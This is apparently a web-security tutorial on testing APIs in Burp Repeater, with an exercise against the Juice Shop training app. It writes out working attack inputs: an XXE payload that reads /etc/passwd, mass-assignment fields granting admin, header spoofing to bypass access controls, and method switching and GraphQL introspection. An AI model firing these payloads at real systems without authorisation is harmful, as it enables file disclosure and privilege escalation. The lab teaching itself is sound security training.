# JSON, Header Manipulation, and API Testing

API endpoints respond differently to unexpected inputs. Test them systematically in Repeater.

## Content-Type Manipulation

```http
# Original
POST /api/data HTTP/1.1
Content-Type: application/json

{"name":"test"}

# Test 1: switch to XML — does the server accept it? XXE possible?
Content-Type: application/xml

<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>

# Test 2: remove Content-Type header entirely — does it still work?
# Test 3: add charset
Content-Type: application/json; charset=utf-8
```

## Mass Assignment — Extra JSON Fields

```http
POST /api/users/register HTTP/1.1
Content-Type: application/json

# Original
{"username":"test","password":"pass123"}

# Test: add privilege fields
{"username":"test","password":"pass123","isAdmin":true,"role":"admin","verified":true}
```
If the server returns a 200 and the new account has admin access → mass assignment confirmed.

## HTTP Method Switching

```http
# Original
GET /api/user/5 HTTP/1.1

# Test these methods in Repeater
DELETE /api/user/5 HTTP/1.1
PUT /api/user/5 HTTP/1.1
PATCH /api/user/5 HTTP/1.1
POST /api/user/5 HTTP/1.1
```

## Header Injection for Access Bypass

```http
# Try these headers on restricted endpoints
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
```

## GraphQL Introspection

If you find a `/graphql` endpoint:
```http
POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"{__schema{types{name fields{name}}}}"}
```
Response lists all types and fields — full schema disclosure.

## Exercise

1. Browse Juice Shop with Burp proxy active
2. Find `/api/Users` in HTTP History (log in first — browse user profile)
3. Send to Repeater — try `GET /api/Users` — what do you see?
4. Try `GET /api/Users/1`, `GET /api/Users/2` — IDOR?
5. Find the registration endpoint — try adding `"isAdmin":true` to the JSON body
6. Check if `/graphql` exists on Juice Shop — run the introspection query
